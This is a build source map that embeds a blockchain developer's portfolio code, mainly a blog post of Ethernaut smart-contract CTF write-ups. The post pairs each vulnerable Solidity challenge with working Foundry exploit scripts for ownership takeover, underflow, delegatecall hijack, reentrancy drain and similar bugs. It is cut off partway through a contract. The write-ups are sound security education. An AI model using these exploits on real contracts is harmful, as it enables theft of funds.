{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 14, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/components/header.tsx/__nextjs-internal-proxy.mjs"],"sourcesContent":["// This file is generated by next-core EcmascriptClientReferenceModule.\nimport { registerClientReference } from \"react-server-dom-turbopack/server\";\nexport const Header = registerClientReference(\n    function() { throw new Error(\"Attempted to call Header() from the server but Header is on the client. It's not possible to invoke a client function from the server, it can only be rendered as a Component or passed to props of a Client Component.\"); },\n    \"[project]/Documents/ShriKrishna/blockchain-developer-portfolio11/components/header.tsx <module evaluation>\",\n    \"Header\",\n);\n"],"names":[],"mappings":"AAAA,uEAAuE;;;;;AACvE;;AACO,MAAM,SAAS,IAAA,8UAAuB,EACzC;IAAa,MAAM,IAAI,MAAM;AAA4N,GACzP,8GACA","ignoreList":[0]}},
    {"offset": {"line": 28, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/components/header.tsx/__nextjs-internal-proxy.mjs"],"sourcesContent":["// This file is generated by next-core EcmascriptClientReferenceModule.\nimport { registerClientReference } from \"react-server-dom-turbopack/server\";\nexport const Header = registerClientReference(\n    function() { throw new Error(\"Attempted to call Header() from the server but Header is on the client. It's not possible to invoke a client function from the server, it can only be rendered as a Component or passed to props of a Client Component.\"); },\n    \"[project]/Documents/ShriKrishna/blockchain-developer-portfolio11/components/header.tsx\",\n    \"Header\",\n);\n"],"names":[],"mappings":"AAAA,uEAAuE;;;;;AACvE;;AACO,MAAM,SAAS,IAAA,8UAAuB,EACzC;IAAa,MAAM,IAAI,MAAM;AAA4N,GACzP,0FACA","ignoreList":[0]}},
    {"offset": {"line": 42, "column": 0}, "map": {"version":3,"sources":[],"names":[],"mappings":""}},
    {"offset": {"line": 50, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/lib/utils.ts"],"sourcesContent":["import { clsx, type ClassValue } from 'clsx'\nimport { twMerge } from 'tailwind-merge'\n\nexport function cn(...inputs: ClassValue[]) {\n  return twMerge(clsx(inputs))\n}\n"],"names":[],"mappings":";;;;AAAA;AACA;;;AAEO,SAAS,GAAG,GAAG,MAAoB;IACxC,OAAO,IAAA,4OAAO,EAAC,IAAA,mNAAI,EAAC;AACtB"}},
    {"offset": {"line": 65, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/components/ui/card.tsx"],"sourcesContent":["import * as React from 'react'\n\nimport { cn } from '@/lib/utils'\n\nfunction Card({ className, ...props }: React.ComponentProps<'div'>) {\n  return (\n    <div\n      data-slot=\"card\"\n      className={cn(\n        'bg-card text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm',\n        className,\n      )}\n      {...props}\n    />\n  )\n}\n\nfunction CardHeader({ className, ...props }: React.ComponentProps<'div'>) {\n  return (\n    <div\n      data-slot=\"card-header\"\n      className={cn(\n        '@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-2 px-6 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6',\n        className,\n      )}\n      {...props}\n    />\n  )\n}\n\nfunction CardTitle({ className, ...props }: React.ComponentProps<'div'>) {\n  return (\n    <div\n      data-slot=\"card-title\"\n      className={cn('leading-none font-semibold', className)}\n      {...props}\n    />\n  )\n}\n\nfunction CardDescription({ className, ...props }: React.ComponentProps<'div'>) {\n  return (\n    <div\n      data-slot=\"card-description\"\n      className={cn('text-muted-foreground text-sm', className)}\n      {...props}\n    />\n  )\n}\n\nfunction CardAction({ className, ...props }: React.ComponentProps<'div'>) {\n  return (\n    <div\n      data-slot=\"card-action\"\n      className={cn(\n        'col-start-2 row-span-2 row-start-1 self-start justify-self-end',\n        className,\n      )}\n      {...props}\n    />\n  )\n}\n\nfunction CardContent({ className, ...props }: React.ComponentProps<'div'>) {\n  return (\n    <div\n      data-slot=\"card-content\"\n      className={cn('px-6', className)}\n      {...props}\n    />\n  )\n}\n\nfunction CardFooter({ className, ...props }: React.ComponentProps<'div'>) {\n  return (\n    <div\n      data-slot=\"card-footer\"\n      className={cn('flex items-center px-6 [.border-t]:pt-6', className)}\n      {...props}\n    />\n  )\n}\n\nexport {\n  Card,\n  CardHeader,\n  CardFooter,\n  CardTitle,\n  CardAction,\n  CardDescription,\n  CardContent,\n}\n"],"names":[],"mappings":";;;;;;;;;;;;;;;;;AAEA;;;AAEA,SAAS,KAAK,EAAE,SAAS,EAAE,GAAG,OAAoC;IAChE,qBACE,oTAAC;QACC,aAAU;QACV,WAAW,IAAA,wLAAE,EACX,qFACA;QAED,GAAG,KAAK;;;;;;AAGf;AAEA,SAAS,WAAW,EAAE,SAAS,EAAE,GAAG,OAAoC;IACtE,qBACE,oTAAC;QACC,aAAU;QACV,WAAW,IAAA,wLAAE,EACX,4JACA;QAED,GAAG,KAAK;;;;;;AAGf;AAEA,SAAS,UAAU,EAAE,SAAS,EAAE,GAAG,OAAoC;IACrE,qBACE,oTAAC;QACC,aAAU;QACV,WAAW,IAAA,wLAAE,EAAC,8BAA8B;QAC3C,GAAG,KAAK;;;;;;AAGf;AAEA,SAAS,gBAAgB,EAAE,SAAS,EAAE,GAAG,OAAoC;IAC3E,qBACE,oTAAC;QACC,aAAU;QACV,WAAW,IAAA,wLAAE,EAAC,iCAAiC;QAC9C,GAAG,KAAK;;;;;;AAGf;AAEA,SAAS,WAAW,EAAE,SAAS,EAAE,GAAG,OAAoC;IACtE,qBACE,oTAAC;QACC,aAAU;QACV,WAAW,IAAA,wLAAE,EACX,kEACA;QAED,GAAG,KAAK;;;;;;AAGf;AAEA,SAAS,YAAY,EAAE,SAAS,EAAE,GAAG,OAAoC;IACvE,qBACE,oTAAC;QACC,aAAU;QACV,WAAW,IAAA,wLAAE,EAAC,QAAQ;QACrB,GAAG,KAAK;;;;;;AAGf;AAEA,SAAS,WAAW,EAAE,SAAS,EAAE,GAAG,OAAoC;IACtE,qBACE,oTAAC;QACC,aAAU;QACV,WAAW,IAAA,wLAAE,EAAC,2CAA2C;QACxD,GAAG,KAAK;;;;;;AAGf"}},
    {"offset": {"line": 167, "column": 0}, "map": {"version":3,"sources":["file:///Users/satyabhaskar/Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blogs/Ethernaut_CTF_Writeups.ts"],"sourcesContent":["import { Blog } from \"../blog-data\";\n\nexport const EthernautCTFChallengesWriteups: Blog = {\n  slug: \"Ethernaut-CTF-Challenges-Writeups\",\n  title: \"Ethernaut CTF Challenges Writeups\",\n  excerpt:\n    \"Understanding one of the most critical vulnerabilities in smart contracts and how to prevent them effectively.\",\n  date: \"2024-01-15\",\n  readTime: \"8 min read\",\n  tags: [\n    \"Openzeppelin\",\n    \"Ethernaut\",\n    \"CTF\",\n    \"Security\",\n    \"Solidity\",\n    \"Vulnerabilities\",\n  ],\n  content: `### Setup \n\n**Install the foundry by using:** [https://book.getfoundry.sh/getting-started/installation](https://book.getfoundry.sh/getting-started/installation)\n\nSolved challenges repository: [https://github.com/BhaskarPeruri/OZ_Ethernaut](https://github.com/BhaskarPeruri/OZ_Ethernaut)\n\nThe challenge contracts are in /src.\n\nSolution scripts are  in / script.\n\nSetup the .env file in the repository and fill the following required fields.\n\n\\`\\`\\`solidity\nRPC_URL=\nMY_ADDRESS=\nPRIVATE_KEY=\n\\`\\`\\`\n\n\n\n## Hello Ethernaut\n\n**Level0.sol**\n\nWe have to deploy the instance  and  call the info() method  on it  and follow the  given instructions to solve this challenge.\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Instance {\n\n  string public password;\n  uint8 public infoNum = 42;\n  string public theMethodName = 'The method name is method7123949.';\n  bool private cleared = false;\n\n  // constructor\n  constructor(string memory _password) public {\n    password = _password;\n  }\n\n  function info() public pure returns (string memory) {\n    return 'You will find what you need in info1().';\n  }\n\n  function info1() public pure returns (string memory) {\n    return 'Try info2(), but with \"hello\" as a parameter.';\n  }\n\n  function info2(string memory param) public pure returns (string memory) {\n    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {\n      return 'The property infoNum holds the number of the next info method to call.';\n    }\n    return 'Wrong parameter.';\n  }\n\n  function info42() public pure returns (string memory) {\n    return 'theMethodName is the name of the next method.';\n  }\n\n  function method7123949() public pure returns (string memory) {\n    return 'If you know the password, submit it to authenticate().';\n  }\n\n  function authenticate(string memory passkey) public {\n    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {\n      cleared = true;\n    }\n  }\n\n  function getCleared() public view returns (bool) {\n    return cleared;\n  }\n}\n\n\\`\\`\\`\n\n**Level0Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level0.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level0Sol is Script{\n    \n    Instance public level0 = Instance(0x45788399AFea13881872eA360A071f86E3D946fb);\n    function run() external{\n        \n        string memory password = level0.password();\n        console.log(\"Password:\",password);\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        level0.authenticate(password);\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`  \n$ source .env\n$ forge script script/Level0Solution.s.sol:Level0Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n\n\n## Fallback\n\n**Level1.sol**\n\n\\`\\`\\`  \n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objectives --claim ownership of  the token and drain it's eth\ncontract Fallback {\n\n  mapping(address => uint) public contributions;\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n\n  modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n\n  function contribute() public payable {\n    require(msg.value < 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n\n  function withdraw() public onlyOwner {\n    payable(owner).transfer(address(this).balance);\n  }\n\n  receive() external payable {\n    require(msg.value > 0 && contributions[msg.sender] > 0);\n    owner = msg.sender;//red flag\n  }\n}\n\n\\`\\`\\`  \n\n**Goal:**\n\nWe need to become  the owner of the contract and drain all the ether from it.\n\n**Explanation:**\n\n1. To set the owner we need to pass the require check in receive().\n2. To pass the check we have to send some ether with the transaction.\n3. So, initially we will send contributions and then send some ether to the contract to invoke the receive() method.\n4. Now, we can call withdraw() function to drain the contract.\n\n**Level1Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level1.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level1Sol is Script{\n    \n    Fallback public level1 = Fallback(payable(0x6318e52C6f116694A9b99761BdbC96faE1ad5B4E));//pass the contract address deployed on the sepolia testnet\n    function run() external{\n        \n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        level1.contribute{value: 1 wei}();\n        address(level1).call{value: 1 wei}(\"\");\n        console.log(\"New owner:\",level1.owner());\n        console.log(\"My address:\",vm.envAddress(\"MY_ADDRESS\"));\n\n        //once we became the owner of the contract, we can now withdraw\n\n        level1.withdraw();\n\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`bash\n$ source .env\n$ forge script script/Level1Solution.s.sol:Level1Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Fallout\n\n**Level2.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\n//objectives-- claim ownership of the contract\n\ncontract Fallout {\n  \n  using SafeMath for uint256;\n  mapping (address => uint) allocations;\n  address payable public owner;\n\n  /* constructor */\n  function Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n\n  modifier onlyOwner {\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    }\n\n  function allocate() public payable {\n    allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n  }\n\n  function sendAllocation(address payable allocator) public {\n    require(allocations[allocator] > 0);\n    allocator.transfer(allocations[allocator]);\n  }\n\n  function collectAllocations() public onlyOwner {\n    msg.sender.transfer(address(this).balance);\n  }\n\n  function allocatorBalance(address allocator) public view returns (uint) {\n    return allocations[allocator];\n  }\n}\n\\`\\`\\`\n\n**Goal**: Claim the ownership of the contract\n\n**Explanation:**\n\n1. In Solidity 0.6.0, the constructor is the function with the same name as the contract. \n2. But in the given challenge, the contract name (Fallout) and the function name(Fal1out) are not the same.\n3. So, we can call this function directly.\n\n**Level2Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"../src/Level2.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level2Sol is Script{\n    \n    Fallout public level2 = Fallout(0xaEb939E61726c0f9d0078c3FC1C1508ABa6C26C4);\n    function run() external{\n        \n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        console.log(\"Owner before\",level2.owner());\n        level2.Fal1out();\n        console.log(\"Owner after\",level2.owner());\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`bash\n$ source .env\n$ forge script script/Level2Solution.s.sol:Level2Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Coin Flip\n\n**Level3.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objective:\n// win the game 10 times at a time\ncontract CoinFlip {\n\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWe have to make the\\`consecutiveWins\\`to 10. We need to guess the coin flip consecutives 10 times.\n\n**Explanation:**\n\n1. We can implement the same logic which is used to find the side of the coin in the CoinFlip contract.\n2. I  wrote a player  contract which will perform the flip() calculation and sends the value to the CoinFlip contract.\n3. Since the entire computaion in  both contracts happens in same transaction, the block.hash and block.number remains same in both contracts.\n4. But we need to run the player script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.\n\n**Level3Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level3.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract player{\n      uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n     constructor(CoinFlip _coinflipInstance){\n            uint256 blockValue = uint256(blockhash(block.number - 1));\n            uint256 coinFlip = blockValue / FACTOR;\n            bool side = coinFlip == 1 ? true : false;\n            _coinflipInstance.flip(side);\n\n     } \n\n}\ncontract Level3Sol is Script{\n    \n    CoinFlip public level3 = CoinFlip(0x4d03165ffad46794329037004988b6De42AaC4DB);//pass the contract address deployed on the sepolia testnet\n    function run() external{\n        \n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new player(level3);\n        console.log(\"consecutive wins:\",level3.consecutiveWins());\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`  \n\n**To run the script**\n\n\\`\\`\\`bash\n$ source .env\n$ forge script script/Level3Solution.s.sol:Level3Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Telephone\n\n**Level4.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**   Claim the ownership of the Telephone contract\n\n**Explanation:**\n\n1. If the msg.sender is equals to tx.origin which means the call was from a EOA. If its not, then the call is from a contract.\n2. To bypass that check, I have an written an intermediary contract  which will call the changeOwner() function.\n3. Thus msg.sender is our intermediary contract and tx.origin is our EOA.\n4. Simply call thechangeOwner()function from the intermediary contract.\n\n**Level4Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level4.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract IntermediatoryContract{\n\n    constructor(Telephone _telephoneInstance, address _newOwner){\n        _telephoneInstance.changeOwner(_newOwner);\n    }\n}\n\ncontract Level4Sol is Script{\n\n    Telephone public level4 = Telephone(0x7Ca95d4b9f0a67539f9A3586e895C67547c76190);\n\n    function run() external{\n    \n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n \n    new IntermediatoryContract(\n        level4,vm.envAddress(\"MY_ADDRESS\")\n    );\n\n    vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`bash\n$ source .env\n$ forge script script/Level4Solution.s.sol:Level4Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n\n## Token\n\n**Level5.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n//objectives :\n//1.take more than 20 tokens\ncontract Token {\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public {\n    balances[msg.sender] = totalSupply = _initialSupply;\n  }\n\n  function transfer(address _to, uint _value) public returns (bool) {\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  }\n\n  function balanceOf(address _owner) public view returns (uint balance) {\n    return balances[_owner];\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWe have initial token balance of 20, we need to take more than 20 tokens.\n\n**Explanation:**\n\n1. This contract uses solidity pragma 0.6.0, in which no arithmetic overflow/underflow checks are not performed by default.\n2. In transfer() function the require check can be bypassed when we pass value as more than 20.\n3. 20 - 21 = -1 which results in 2**256 - 1. Which is >= 0 and the same will happens in the update of balance at sender.\n4. balances[msg.sender] -= _value; will become balance[msg.sender] = 20 - 21 = 2**256 -1.\n\n**Level5Solution.s.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"../src/Level5.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level5Sol is Script{\n\n    Token public level5 = Token(0xf363A66580c0E202396333d08Fc53e18cbcc625F);\n\n    function run() external{\n    \n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n    console.log(\"total supply:\",level5.totalSupply());\n    level5.transfer(address(0),21);\n    console.log(\"MY balance:\",level5.balanceOf(vm.envAddress(\"MY_ADDRESS\")));\n    vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level5Solution.s.sol:Level5Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n\n## Delegation\n\n**Level6.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objective:\n//claim ownership \n\ncontract Delegate {\n\n  address public owner;\n\n  constructor(address _owner) {\n    owner = _owner;\n  }\n\n  function pwn() public {\n    owner = msg.sender;\n  }\n}\n\ncontract Delegation {\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) {\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  }\n\n  fallback() external {\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) {\n      this;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\nClaim ownership of Delegation contract\n\n**Explanation:**\n\n1. Delegation contracts uses delegatecall to call the other contract Delegate.\n2. One thing to remember with delegatecall is that it will maintain the msg.sender and msg.value when it calls other contract.\n3. And also it updates the caller contract storage not the contract which being called.\n4. So, when we call pwn() on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.\n\n**Level6Solution.s.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level6.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level6Sol is Script{\n\n    Delegation public level6 = Delegation(0xCAfBaEb598da2251121AD148766f2a6c4B4C2dB7);\n\n    function run()  external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        console.log(\"Initial Owner : \", level6.owner());\n        \n        address(level6).call(abi.encodeWithSignature(\"pwn()\"));\n\n        console.log(\"Final Owner : \", level6.owner());\n        vm.stopBroadcast();\n\n    }\n\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level6Solution.s.sol:Level6Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Force\n\n**Level7.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/}\n\\`\\`\\`\n\n**Goal:**\n\nWe need to make the balance of the Force contract more than 0.\n\n**Explanation:**\n\n1. There is no receive()/fallback() function and no payable functions in the Force contract.\n2. If we send any ether to this contract it will be reverted.\n3. One thing ,  we can  do is that  deploy a contract with some ether and implement a selfdestruct function and pass the recepient as the Force contract address.\n4. Upon selfdestruct of the Attack contract, Force contract will receive ether.\n\n**Level7Solution.s.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract ToBeDestructed{\n    constructor(address payable _forceAddress) payable{\n        selfdestruct(_forceAddress);\n    }\n}\n\ncontract Level7Sol is Script{\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new ToBeDestructed{value: 1 wei}(payable(0x562488c3a3f2208737b860fF335cfBc3CD306865));\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level7Solution.s.sol:Level7Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Vault\n\n**Level8.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Vault {\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) {\n    locked = true;\n    password = _password;\n  }\n\n  function unlock(bytes32 _password) public {\n    if (password == _password) {\n      locked = false;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWe need to unlock the vault.\n\n**Explanation**:\n\n1. We can simply call the unlock() function with password. But the password was not publicly accessible.\n2. Declaring a variable private doesn’t mean that no one can read that variable. Only the other contracts which interacts with it won’t able to view that variable.\n3. We can solve this by two ways, one is using with foundry vm.load and another is using with blockchain explorer(Sepolia Etherscan). \n4. I used  vm.load. in foundry.\n\n**Level8Solution.s.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level8.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level8Sol is Script{\n     \n     Vault public level8 = Vault(0x826c120B1C2b48fd2ad8C7015BcbfFe33A851E7A);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes32 password = vm.load(address(level8), bytes32(uint256(1)));\n        console.logBytes32(password);\n        level8.unlock(password);\n\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level8Solution.s.sol:Level8Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## King\n\n**Level9.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n\n  address king;\n  uint public prize;\n  address public owner;\n\n  constructor() payable {\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  receive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  function _king() public view returns (address) {\n    return king;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nBe the King and make others dont claim the King position again.\n\n**Explanation:**\n\n1. Initially check the prize amount that need to send to be the king. And send the prize amount to the King contract.\n2. When someone send the prize amount back to us to claim the king position, we can deny the money.\n3. So, that they wont be the king anymore.\n4. In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any receive()/fallback() function.\n5. This will revert others transaction when they sends prize to us, So, we will remain as the king.\n\n**Level9Solution.s.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level9.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n    constructor(King _kingInstance) payable {\n        address(_kingInstance).call{value:_kingInstance.prize()}(\"\");//calling the receiver function in King contract\n    }\n    //since there is no fallback or receive function in this contract ,we can successfully denied the money\n}\n\ncontract Level9Sol is Script{\n\n    King public kingInstance = King(payable(0xb6Db4938daB72C9e2DF8a19eE5846D2692872441));\n\n    function run() external {\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n    \n    console.log(\"first King is :\",kingInstance._king());\n    console.log(\"first prize is:\",kingInstance.prize());\n  \n    new Attack{value:kingInstance.prize()}(kingInstance);\n\n    console.log(\"second King is :\",kingInstance._king());\n    console.log(\"second prize is:\",kingInstance.prize());\n\n    vm.stopBroadcast();\n\n    }\n\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level9Solution.s.sol:Level9Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Reentrancy\n\n**Level10.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n\n\\`\\`\\`\n\n**Goal:**\n\nDrain all the ether of the Reentrance contract.\n\n**Explanation**:\n\n1. The withdraw() function is vulnerable to Reentrancy, as it is updating the user balance after the external call.\n2. One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.\n3. So, we will donate some ether to the contract and then call withdraw from a contract.\n4. The withdraw call send our ether back and invokes the fallback or receive function of our contract.\n5. We can call the withdraw() function again from the fallback function to reenter again into Reentrance contract.\n6. Still we can manage to pass require check as our balance wasn’t updated yet.\n7. We need to check the balance of the Reentrance contract before reentering because when we call the withdraw again after the balance of Reentrance becomes zero will revert the entire transaction.\n\n**Level10Solution.s.sol**\n\n\\`\\`\\`\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport \"../src/Level10.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n    Reentrance public r_instance =Reentrance(0x1e5f76396a5b433c9c462c919dAf64Eed6bD4926);\n\n    function exploit() external payable{\n\n        r_instance.donate{value: 0.001 ether}(address(this));\n        r_instance.withdraw(0.001 ether);\n    }\n    receive() external payable{\n        if(address(r_instance).balance >= 0.001 ether){\n             r_instance.withdraw(0.001 ether);\n        }\n    }\n}\n\ncontract Level10Sol is Script{\n    function run() external {\n            vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n            new Attack().exploit{value: 0.001 ether}();\n            vm.stopBroadcast();\n    }\n}\n\\`\\`\\`   \n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level10Solution.s.sol:Level10Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Elevator\n\n**Level11.sol**\n\n\\`\\`\\`\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Building {\n  function isLastFloor(uint) external returns (bool);\n}\n\ncontract Elevator {\n  bool public top;\n  uint 